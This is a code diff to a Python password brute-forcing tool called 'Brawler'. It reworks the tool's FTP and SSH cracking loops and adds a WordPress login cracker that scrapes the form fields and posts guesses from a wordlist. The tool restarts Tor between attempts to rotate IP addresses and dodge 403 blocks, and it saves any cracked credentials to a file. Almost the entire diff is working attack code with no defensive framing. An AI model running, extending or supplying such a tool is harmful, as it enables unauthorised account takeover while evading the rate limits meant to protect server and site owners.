@@ -24,6 +24,9 @@ from paramiko import SSHClient, AutoAddPolicy, ssh_exception
 from subprocess import run
 from time import sleep
 from re import compile
+from requests import Session
+from io import BytesIO
+from lxml import etree
 
 # Doing the basic configuration for the debugging feature
 basicConfig(level=DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -42,6 +45,8 @@ reset_color = '\033[0m'  # Reset color to default
 
 # Creating a pattern for ip address validation
 ip_addr_regex = compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}')
+
+SUCCESS = 'Welcome to WordPress!'
 
 class Brawler:
 
@@ -70,46 +75,48 @@ class Brawler:
 
         try:
 
+            self.restart_tor_service()
+
             with open(self.wordlist, 'r') as pw:
 
                 passwords = pw.readlines()
 
-                print(f'{len(passwords)} passwords found.\n')
+            print(f'{len(passwords)} passwords found.\n')
 
-                for passwd in passwords:
+            for passwd in passwords:
 
-                    password = passwd.strip('\r\n')
+                password = passwd.strip('\r\n')
 
-                    try:
-                        
-                        print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
-                        # print(f'Trying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
-                        
-                        ftp = FTP(timeout=10)
+                try:
+                    
+                    print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
+                    # print(f'Trying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
+                    
+                    ftp = FTP(timeout=10)
 
-                        ftp.connect(self.target, port)
+                    ftp.connect(self.target, port)
 
-                        ftp.login(self.username, password)
+                    ftp.login(self.username, password)
 
-                        print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}\nOutput -> {self.output}\n')
+                    print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}\nOutput -> {self.output}\n')
 
-                        with open(self.output, 'w') as credentials:
+                    with open(self.output, 'w') as credentials:
 
-                            credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')
+                        credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')
 
-                        ftp.quit()
+                    ftp.quit()
 
-                        break
+                    break
 
-                    except error_perm as exc:
+                except error_perm as exc:
 
-                        print(f'{red_color}{exc} Still trying...{reset_color}\n')
+                    print(f'{red_color}{exc} Still trying...{reset_color}\n')
 
-                    except Exception as exx:
+                except Exception as exx:
 
-                        print(f'{red_color}{exx} Still trying...{reset_color}\n')
+                    print(f'{red_color}{exx} Still trying...{reset_color}\n')
 
-                    self.restart_tor_service()
+                self.restart_tor_service()
 
         except Exception as exc:
             print(f'Error: {red_color}{exc}{reset_color}')
@@ -123,45 +130,155 @@ class Brawler:
 
         try:
 
+            self.restart_tor_service()
+
             with open(self.wordlist, 'r') as pw:
 
                 passwords = pw.readlines()
 
-                print(f'{len(passwords)} passwords found.\n')
+            print(f'{len(passwords)} passwords found.\n')
 
-                for passwd in passwords:
+            for passwd in passwords:
 
-                    password = passwd.strip('\r\n')
+                password = passwd.strip('\r\n')
 
-                    try:
+                try:
 
-                        print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
-                        # print(f'Trying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
+                    print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}')
+                    # print(f'Trying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
 
-                        ssh = SSHClient()
+                    ssh = SSHClient()
 
-                        ssh.set_missing_host_key_policy(AutoAddPolicy())
-                        
-                        ssh.connect(self.target, port=port, username=self.username, password=password)
-
-                        print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}\nOutput -> {self.output}\n')
-
-                        with open(self.output, 'w') as credentials:
-
-                            credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')
-
-                        ssh.close()
-
-                        break
+                    ssh.set_missing_host_key_policy(AutoAddPolicy())
                     
-                    except Exception as exc:
+                    ssh.connect(self.target, port=port, username=self.username, password=password)
 
-                        print(f'{red_color}{exc} Still trying...{reset_color}\n')
+                    print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}\nOutput -> {self.output}\n')
 
-                    self.restart_tor_service()
+                    with open(self.output, 'w') as credentials:
+
+                        credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')
+
+                    ssh.close()
+
+                    break
+                
+                except Exception as exc:
+
+                    print(f'{red_color}{exc} Still trying...{reset_color}\n')
+
+                self.restart_tor_service()
 
         except Exception as exc:
             print(f'Error: {red_color}{exc}{reset_color}')
+
+    def crack_wp(self):
+        """A function which cracks wp passwords"""
+
+        print(f'{golden_color}Cracking WP password{reset_color}\n{"-" * 30}')
+
+        try:
+
+            self.restart_tor_service()
+
+            with open(self.wordlist, 'r') as pw:
+
+                passwords = pw.readlines()
+
+            print(f'{len(passwords)} passwords found.\n')
+
+            for passwd in passwords:
+
+                password = passwd.strip('\r\n')
+                
+                try:
+
+                    attempt = self.wp_login_attempt(passwords=passwords, passwd=passwd, password=password)
+                    debug(attempt)
+
+                    if SUCCESS in attempt:
+
+                        print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}"\nOutput -> {self.output}\n')
+
+                        with open(self.output, 'w') as credentials:
+
+                            credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nType = {self.choice}')
+
+                        break
+
+                    else:
+
+                        print(f'{red_color}Login Failed. Still trying...{reset_color}\n')
+
+                except Exception as exc:
+
+                    print(f'{red_color}{exc} Still trying...{reset_color}\n')
+
+                # self.restart_tor_service()
+
+        except Exception as exc:
+
+            print(f'Error: {red_color}{exc}{reset_color}')
+
+    def wp_login_attempt(self, passwords, passwd, password):
+        """A function which tries to send a successfull post request to WordPress login page"""
+
+        while True:
+
+            try:
+
+                print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}"')
+                
+                session = Session()
+
+                resp0 = session.get(self.target)
+
+                params = self.get_params(resp0.content)
+
+                params['log'] = self.username
+
+                params['pwd'] = password
+
+                resp1 = session.post(self.target, data=params)
+
+                resp1_status = int(resp1.status_code)
+
+                debug(f'Response Status Code = {resp1_status}')
+
+                if resp1_status != 403:
+
+                    return resp1.content.decode()
+
+                    break
+
+                else:
+
+                    self.restart_tor_service()
+
+            except Exception as err:
+
+                print(f'{red_color}{err} Still trying...{reset_color}\n')
+
+                self.restart_tor_service()
+
+    def get_params(self, content):
+        """A function which creates a params dictionary to brute force WordPress HTML forms"""
+
+        params = dict()
+
+        parser = etree.HTMLParser()
+        
+        tree = etree.parse(BytesIO(content), parser=parser)
+        
+        for elem in tree.findall('//input'):
+        
+            name = elem.get('name')
+        
+            if name is not None:
+        
+                params[name] = elem.get('value', None)
+
+        return params
 
     def get_public_ip_addr(self):
         """A function which gets user's public IP address"""
@@ -239,7 +356,7 @@ def main():
     # Add arguments
     parser.add_argument('-v', '--version', action="store_true", help="Display the application's version information",)
 
-    parser.add_argument('choice', choices=['ssh', 'ftp'], nargs="?", help="Choice of platform (ssh, ftp)")
+    parser.add_argument('choice', choices=['ssh', 'ftp', 'wp'], nargs="?", help="Choice of platform (ssh, ftp, wp)")
 
     parser.add_argument('-u', '--username', help="User's username who is authorized in the server")
 
@@ -274,6 +391,19 @@ def main():
 
             app.crack_ftp()
 
+        else:
+
+            print("Invalid choice. Use -h or --help to get more information.")
+
+
+    elif args.choice and args.username and args.target and args.source_path and args.destination_path:
+        
+        if args.choice == "wp":
+            
+            app = Brawler(choice=args.choice, username=args.username, target=args.target, port=None, wordlist=args.source_path, output=args.destination_path)
+
+            app.crack_wp()
+    
         else:
 
             print("Invalid choice. Use -h or --help to get more information.")
